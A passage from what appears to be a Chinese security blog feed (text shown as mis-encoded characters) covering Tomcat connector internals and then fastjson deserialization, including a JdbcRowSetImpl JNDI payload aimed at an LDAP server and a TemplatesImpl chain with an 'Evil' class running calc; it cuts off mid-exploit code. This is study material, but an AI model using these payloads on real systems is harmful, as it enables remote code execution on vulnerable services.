è¿‡æ¥çš„æ•°æ®ï¼Œç„¶åç”ŸæˆRequestå’ŒResponseå¯¹è±¡ã€‚</p><p>åœ¨Tomcatä¸­æœ‰ä¸€ä¸ªConnectorç±»å¯ä»¥å»çœ‹çœ‹ä»–çš„setProtocolæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409221831079.png" alt="image-20240922183030860"></p><p>ä»–è¿™é‡Œä¼šæ ¹æ®é€‰æ‹©ä¸åŒçš„å¤„ç†ç±»ï¼Œè¿™ä¸ªprotocolå°±æ˜¯æˆ‘ä»¬server.xmlé‚£é‡Œé…ç½®çš„</p><p><img src="https://cdn.clown2024.cn/202409221835409.png" alt="image-20240922183544328"></p><p>ç„¶åHTTP1.1å¯¹åº”çš„ä¸¤ä¸ªå¤„ç†ç±»çš„åŒºåˆ«å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">org.apache.coyote.http11.Http11AprProtocol ---BIO<br>org.apache.coyote.http11.Http11NioProtocol ---NIO<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆè¿™äº›ç±»å°±æ˜¯è´Ÿè´£socketçš„è¿æ¥ç®¡ç†å’Œæ•°æ®è¯»å–ï¼Œæˆ‘ä»¬å¯ä»¥è¿›å»çœ‹ä¸€ä¸‹ï¼Œè¿™é‡Œçœ‹ä¸€ä¸‹Http11NioProtocolçš„NIOè¯»å–æ•°æ®</p><p><img src="https://cdn.clown2024.cn/202409222021606.png" alt="image-20240922202104507"></p><p>è¿™é‡Œé¢newäº†ä¸€ä¸ªNioEndpointï¼Œè¿™å°±æ˜¯tomcatçš„ä¸€ä¸ªè¿æ¥å™¨ï¼Œç”¨äºå¤„ç†ç½‘ç»œè¿æ¥ï¼Œçœ‹ä¸€ä¸‹ä»–é‡Œé¢çš„æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409222023442.png" alt="image-20240922202358352"></p><p>è¿™é‡Œçš„Acceptorç±»æ˜¯ä¸€ä¸ªç”¨äºå¤šçº¿ç¨‹æ‰§è¡Œä»»åŠ¡çš„ï¼Œå› ä¸ºAbstractEndpoint.Acceptorå®ç°äº†Runnableæ¥å£ï¼Œç„¶åä¸‹é¢å¯ä»¥çœ‹åˆ°å®ƒacceptäº†socketè¿æ¥</p><p>é‚£æ¥å—äº†socketä¹‹åå°±éœ€è¦å»å¤„ç†è¿™ä¸ªsocketè¿æ¥ï¼Œæˆ‘ä»¬æ¥ç€çœ‹</p><p><img src="https://cdn.clown2024.cn/202409222031639.png" alt="image-20240922203110543"></p><p>è¿™é‡Œå°±ä¼šè°ƒç”¨ä¸€ä¸ªsetSocketOptionsæ¥å¤„ç†socketï¼Œå¦‚æœè¿”å›falseåˆ™å…³é—­socketï¼Œæˆ‘çœ‹è§†é¢‘é‡Œçš„ç‰ˆæœ¬ä»–çš„æ˜¯porcessSocketæ–¹æ³•(å¯èƒ½æ˜¯bioçš„æ–¹æ³•)ï¼Œæˆ‘çœ‹äº†æˆ‘çš„bioæ–¹æ³•å®ƒä½¿ç”¨çš„æ˜¯<strong>processSocketWithOptions</strong>æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409222045016.png" alt="image-20240922204517909"></p><p>nioè¿˜æ²¡å­¦ä¹ çœ‹ä¸å¤ªæ˜ç™½ï¼Œä½†æ˜¯æœ€ç»ˆå°±æ˜¯åœ¨è¿™é‡Œå¤„ç†äº†ï¼ŒBIOå°±æ˜¯ä½¿ç”¨çº¿ç¨‹æ± çš„æ–¹å¼æ¥è¯»å–socketæ•°æ®</p><p><img src="https://cdn.clown2024.cn/202409222049587.png" alt="image-20240922204936475"></p><p>è¿™æ˜¯bioçš„è¯»å–æ–¹å¼ï¼Œç„¶åç»§ç»­å¾€ä¸‹è·Ÿå°±æ˜¯ä¸€äº›æ•°æ®è§£æç„¶åæ„é€ Requestå¯¹è±¡ï¼Œå°±ä¸åˆ†æï¼Œæœ‰ä¸ªå¤§æ¦‚æ¦‚å¿µå°±è¡Œã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å­¦å†…å­˜é©¬å‰å°±è¦æ¥å­¦ä¸€å­¦java webä¸‰å¤§ä»¶çš„ç›¸å…³åŸç†ï¼šServletã€Filterã€Listener&lt;/p&gt;
&lt;p&gt;å‚è€ƒæ–‡ç« ï¼š&lt;a href=&quot;https://www.cnblogs.com/jadite/p/16951328.html&quot;&gt;https://www.cnbl</summary>
      
    
    
    
    <category term="javaåŸºç¡€" scheme="https://clowsman.github.io/categories/java%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>fastjsonååºåˆ—åŒ–</title>
    <link href="https://clowsman.github.io/2024/08/24/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/08/24/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-08-23T17:35:44.000Z</published>
    <updated>2024-10-11T05:02:20.059Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fastjsonä»‹ç»"><a href="#fastjsonä»‹ç»" class="headerlink" title="fastjsonä»‹ç»"></a>fastjsonä»‹ç»</h1><p>å®˜æ–¹githubåœ°å€ï¼š<a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p><p>fastjsonæ˜¯é˜¿é‡Œå·´å·´çš„å¼€æºJSONè§£æåº“ï¼Œå®ƒå¯ä»¥è§£æJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°†Java Beanåºåˆ—åŒ–ä¸ºJSONå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä»JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ°JavaBeanã€‚</p><p><strong>ç®€å•ä¾‹å­</strong></p><p>ç”¨Jsonçš„toJSONStringæ–¹æ³•å°†pojoç±»è½¬æ¢æˆå­—ç¬¦ä¸²</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Test1;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Studentæ„é€ å‡½æ•°&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        student.setName(<span class="hljs-string">&quot;clown&quot;</span>);<br>        student.setAge(<span class="hljs-number">23333</span>);<br>        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteClassName));<br>        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteEnumUsingToString));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408281554948.png" alt="image-20240828155427856"></p><p>è¿™é‡Œçš„<strong>SerializerFeature.WriteClassName</strong>é¡¾åæ€ä¹‰å°±æ˜¯æŒ‡å®šåºåˆ—åŒ–å‡ºæ¥çš„å­—ç¬¦ä¸²çš„æ ¼å¼ï¼Œè¿™é‡Œå°±æ˜¯å†™å‡ºç±»åå’Œé”®å€¼å¯¹å½¢å¼ï¼Œæ›´å¤šçš„å¯ä»¥çœ‹æºç å°è¯•</p><p>JSON.parseObjectå°†å­—ç¬¦ä¸²è½¬æ¢å›pojo</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Test1;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Studentæ„é€ å‡½æ•°&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        student.setName(<span class="hljs-string">&quot;clown&quot;</span>);<br>        student.setAge(<span class="hljs-number">23333</span>);<br>        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteClassName));<br>        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteEnumUsingToString));<br>        <span class="hljs-comment">//è½¬å˜å›pojo</span><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.clown.Test1.Student\&quot;,\&quot;age\&quot;:23333,\&quot;name\&quot;:\&quot;clown\&quot;&#125;&quot;</span>, Student.class, Feature.SupportNonPublicField);<br>        System.out.println(obj);<br>        System.out.println(obj.getClass().getName());<br>        System.out.println(obj.getName() + <span class="hljs-string">&quot; &quot;</span> + obj.getAge());<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408281555070.png" alt="image-20240828155545016"></p><p>è¿™é‡Œæ³¨æ„è¦å†™å…¨ç±»åä¸ç„¶ä¼šæŠ¥é”™</p><p>è¿™é‡Œçš„<strong>Feature.SupportNonPublicField</strong>é¡¾åæ€ä¹‰ä¹Ÿæ˜¯è¿˜åŸçš„ç‰¹ç‚¹ï¼Œè¿™é‡Œæ˜¯è¿˜åŸç§æœ‰å±æ€§</p><p>ç„¶åæˆ‘ä»¬æ³¨æ„åˆ°è¿™é‡Œè½¬æ¢æˆpojoå¯¹è±¡æ—¶ä¼šè°ƒç”¨æ„é€ å‡½æ•°ï¼Œå…¶å®è¿˜ä¼šè°ƒç”¨ä»–çš„setå’Œgetæ–¹æ³•ï¼Œæ‰€ä»¥fastjsonçš„ååºåˆ—åŒ–æŒ‡çš„å¹¶ä¸æ˜¯javaåŸç”Ÿçš„ååºåˆ—åŒ–ï¼Œè€Œæ˜¯ä»–jsonè½¬åŒ–çš„è¿‡ç¨‹ã€‚</p><p>å°†ä»£ç æ”¹ä¸€ä¸‹çœ‹ä¸€ä¸‹æ•ˆæœ</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Test1;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Studentæ„é€ å‡½æ•°&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMap</span><span class="hljs-params">(String map)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;setMap&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getMap</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getMap&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//è¿™ç§æ–¹æ³•ä¼šè°ƒç”¨getå’Œsetæ–¹æ³•</span><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.clown.Test1.Student\&quot;,\&quot;age\&quot;:23333,\&quot;name\&quot;:\&quot;clown\&quot;,\&quot;map\&quot;:\&quot;ceshi\&quot;&#125;&quot;</span>);<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">javaObject</span> <span class="hljs-operator">=</span> obj.toJavaObject(Student.class); <span class="hljs-comment">//åªä¼ ä¸€ä¸ªå‚æ•°åªè¿”å›JSONObjectç±»å‹ï¼Œå¯ä»¥è¿™æ ·è½¬æ¢</span><br>        <span class="hljs-comment">//System.out.println(javaObject.getName() + &quot; &quot; + javaObject.getAge()+ &quot; &quot; + javaObject.getMap());</span><br>        System.out.println(<span class="hljs-string">&quot;------------------&quot;</span>);<br>        <span class="hljs-comment">//è¿™ç§æ–¹æ³•åªè°ƒç”¨setæ–¹æ³•</span><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.clown.Test1.Student\&quot;,\&quot;age\&quot;:23333,\&quot;name\&quot;:\&quot;clown\&quot;&#125;&quot;</span>, Student.class);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408282208338.png" alt="image-20240828220804265"></p><p>å¯ä»¥çœ‹åˆ°è½¬æ¢çš„æ—¶å€™ä¼šå†ä¸€æ¬¡è°ƒç”¨setæ–¹æ³•ï¼Œè€Œä¸”æ³¨æ„è¿™é‡Œçš„mapå±æ€§æˆ‘æ˜¯æ²¡æœ‰å®šä¹‰çš„ï¼Œä½†è¦æ˜¯æˆ‘çš„jsonå­—ç¬¦ä¸²é‡Œæœ‰mapå±æ€§ä¹Ÿä¼šè°ƒç”¨å¯¹åº”çš„æ–¹æ³•ï¼Œä¸è¿‡å¯¹åº”çš„javaå¯¹è±¡getå›æ¥çš„å±æ€§å€¼å°±ä¸ºnull</p><p>è¿™é‡Œcopyä¸€ä¸‹y4âœŒçš„æ€»ç»“ï¼š<a href="https://github.com/Y4tacker/JavaSec/blob/main/3.FastJson%E4%B8%93%E5%8C%BA/Fastjson%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/Fastjson%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95.md">https://github.com/Y4tacker/JavaSec/blob/main/3.FastJson%E4%B8%93%E5%8C%BA/Fastjson%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/Fastjson%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95.md</a></p><ul><li>å½“ååºåˆ—åŒ–ä¸º<code>JSON.parseObject(*)</code>å½¢å¼å³æœªæŒ‡å®šclassæ—¶ï¼Œä¼šè°ƒç”¨ååºåˆ—åŒ–å¾—åˆ°çš„ç±»çš„æ„é€ å‡½æ•°ã€æ‰€æœ‰å±æ€§çš„getteræ–¹æ³•ã€JSONé‡Œé¢çš„éç§æœ‰å±æ€§çš„setteræ–¹æ³•ï¼Œå…¶ä¸­propertieså±æ€§çš„getteræ–¹æ³•ä¼šè¢«è°ƒç”¨ä¸¤æ¬¡ï¼›</li><li>å½“ååºåˆ—åŒ–ä¸º<code>JSON.parseObject(*,*.class)</code>å½¢å¼å³æŒ‡å®šclassæ—¶ï¼Œåªè°ƒç”¨ååºåˆ—åŒ–å¾—åˆ°çš„ç±»çš„æ„é€ å‡½æ•°ã€JSONé‡Œé¢çš„éç§æœ‰å±æ€§çš„setteræ–¹æ³•ã€propertieså±æ€§çš„getteræ–¹æ³•ï¼›</li><li>å½“ååºåˆ—åŒ–ä¸º<code>JSON.parseObject(*)</code>å½¢å¼å³æœªæŒ‡å®šclassè¿›è¡Œååºåˆ—åŒ–æ—¶å¾—åˆ°çš„éƒ½æ˜¯JSONObjectç±»å¯¹è±¡ï¼Œè€Œåªè¦æŒ‡å®šäº†classå³<code>JSON.parseObject(*,*.class)</code>å½¢å¼å¾—åˆ°çš„éƒ½æ˜¯ç‰¹å®šçš„Studentç±»ï¼›</li></ul><blockquote><p>è¿˜æœ‰æºç çš„è°ƒç”¨åˆ†æä¸å†™äº†å¤ªè‡­å¤ªé•¿äº†ï¼Œçœ‹ç»„é•¿çš„è§†é¢‘å·²ç»è¦æ™•äº†ï¼Œåé¢çœ‹é“¾å­çš„æ—¶å€™ç©¿æ’ç€åˆ†æå§</p></blockquote><p>è¿™é‡Œè¿˜æœ‰ä¸€å¼ è°ƒç”¨ç±»çš„å…³ç³»å›¾</p><p><img src="https://cdn.clown2024.cn/202408282214028.png" alt="1"></p><blockquote><p>JSONï¼šé—¨é¢ç±»ï¼Œæä¾›å…¥å£</p><p>DefaultJSONParserï¼šä¸»ç±»</p><p>ParserConfigï¼šé…ç½®ç›¸å…³ç±»</p><p>JSONLexerBaseï¼šå­—ç¬¦åˆ†æç±»</p><p>JavaBeanDeserializerï¼šJavaBeanååºåˆ—åŒ–ç±»</p></blockquote><p>fastjsonçš„åˆ©ç”¨çš„å…¥å£ç‚¹å°±æ˜¯å¯¹åº”çš„setæˆ–getæ–¹æ³•çš„é“¾å­</p><h1 id="fastjson122-124-jndi"><a href="#Fastjson1-22-1-24-JNDI" class="headerlink" title="Fastjson1.22-1.24 JNDI"></a>Fastjson1.22-1.24 JNDI</h1><h2 id="åŸºäºjdbcrowsetimplçš„åˆ©ç”¨é“¾"><a href="#åŸºäºJdbcRowSetImplçš„åˆ©ç”¨é“¾" class="headerlink" title="åŸºäºJdbcRowSetImplçš„åˆ©ç”¨é“¾"></a>åŸºäºJdbcRowSetImplçš„åˆ©ç”¨é“¾</h2><p>ä»–çš„è§¦å‘ç‚¹åœ¨**JdbcRowSetImpl#connect()**é‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202408291556886.png" alt="image-20240829155500981"></p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:9999/mQAZldWR\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;;<br>JSON.parse(payload);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408291630333.png" alt="image-20240829163040221"></p><blockquote><p>è¿™é‡Œpayloadç”¨parseæˆ–è€…parseObjectéƒ½èƒ½è§¦å‘</p><p>è¿™é‡Œè¿˜å­¦åˆ°äº†ç”¨yakitç›´æ¥æ­å»ºJNDIæœåŠ¡å™¨ï¼Œç‰¹åˆ«æ–¹ä¾¿</p><p><img src="https://cdn.clown2024.cn/202408291629022.png" alt="image-20240829162951907"></p><p>é…ç½®ä¸€ä¸‹payloadå°±èƒ½ç›´æ¥ç”¨äº†</p></blockquote><p>çœ‹ä¸€ä¸‹åˆ©ç”¨é“¾è¿‡ç¨‹å§ï¼Œè¿™æ˜¯ä»setæ–¹æ³•æ‰“çš„ï¼Œæ ¹æ®payloadæˆ‘ä»¬å»çœ‹ä¸€ä¸‹setAutoCommitæ–¹æ³•ï¼Œå› ä¸ºæˆ‘ä»¬è®¾ç½®äº†autoCommitå±æ€§ä»–å°±ä¼šèµ°åˆ°è¿™</p><p><img src="https://cdn.clown2024.cn/202408291726876.png" alt="image-20240829172622802"></p><p>è¿™é‡Œconnä¸€å¼€å§‹ä¸ºç©ºå°±ä¼šèµ°åˆ°connect()æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202408291730922.png" alt="image-20240829173035857"></p><p><img src="https://cdn.clown2024.cn/202408291730868.png" alt="image-20240829173051811"></p><p>ç„¶åæˆ‘ä»¬payloadé‡Œé¢æ§åˆ¶äº†ä¸€ä¸‹dataSourceå±æ€§å€¼ä¸ºæ¶æ„ldapæœåŠ¡å™¨å³å¯</p><p><strong>è°ƒè¯•ä¸€ä¸‹æ‰§è¡Œæµç¨‹</strong></p><p>å…¶å®å°±æ˜¯èµ°ä¸€ä¸‹å‰é¢æ²¡åˆ†æçš„ååºåˆ—åŒ–çš„è¿‡ç¨‹é¡ºä¾¿è°ƒä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202408291632353.png" alt="image-20240829163154441"></p><p>å› ä¸ºè¦åˆ°toJSONæ–¹æ³•æ‰ä¼šè°ƒç”¨getæ–¹æ³•ï¼Œå‰é¢ç›´æ¥åˆ°parseè°ƒç”¨setæ–¹æ³•è§¦å‘æ›´å®¹æ˜“æ»¡è¶³æ¡ä»¶</p><p>ä¸€è·¯è·Ÿè¿›åˆ°è¿™é‡Œ</p><p><img src="https://cdn.clown2024.cn/202408291705004.png" alt="image-20240829170515929"></p><p>è·å–ä¸€ä¸ªååºåˆ—åŒ–å™¨ï¼Œç„¶åç»§ç»­å¾€é‡Œè·Ÿè¿›</p><p><img src="https://cdn.clown2024.cn/202408291700828.png" alt="image-20240829170031726"></p><p>è¿™é‡Œå»ºç«‹ä¸€ä¸ªJavaBeanInfoç±»ï¼Œé‡Œé¢å°±è¿›è¡Œäº†å¯¹è¯¥ç±»çš„å„ç§å­—æ®µå’Œæ–¹æ³•è¿˜æœ‰æ„é€ å™¨çš„å°è£…ç­‰ï¼Œåé¢æœ‰é“¾å­éœ€è¦åˆ©ç”¨åˆ°å†è¯¦ç»†è¯´</p><p><img src="https://cdn.clown2024.cn/202408291649160.png" alt="image-20240829164912083"></p><p>ç„¶åç»§ç»­è·Ÿè¿›åˆ°æ‰§è¡Œlookupçš„åœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/202408291719865.png" alt="image-20240829171913782"></p><p>è¿™é‡Œçš„getDataSourceName()æˆ‘ä»¬å¯ä»¥æ§åˆ¶</p><p><img src="https://cdn.clown2024.cn/202408291719522.png" alt="image-20240829171950465"></p><p>ç„¶åæˆåŠŸå¼¹è®¡ç®—å™¨ã€‚</p><p>ä¸è¿‡jndiçš„æ‰“æ³•æœ‰ç‰ˆæœ¬é™åˆ¶ã€ä¾èµ–é™åˆ¶ä»¥åŠè¦å‡ºç½‘</p><h1 id="fastjson122-124-templatesimpl"><a href="#Fastjson1-22-1-24-TemplatesImpl" class="headerlink" title="Fastjson1.22-1.24 TemplatesImpl"></a>Fastjson1.22-1.24 TemplatesImpl</h1><p><strong>é™åˆ¶</strong></p><p>è¯¥åˆ©ç”¨é“¾éœ€è¦è®¾ç½®<code>Feature.SupportNonPublicField</code>æ‰èƒ½æˆåŠŸè§¦å‘</p><p><strong>åˆ©ç”¨ä»£ç </strong></p><p>å†™ä¸€ä¸ªæ¶æ„ç±»ç»§æ‰¿<strong>AbstractTranslet</strong> </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> &#123;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> &#123;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Evil</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Evil</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†å†™ä¸€ä¸ªexp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(cls);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title 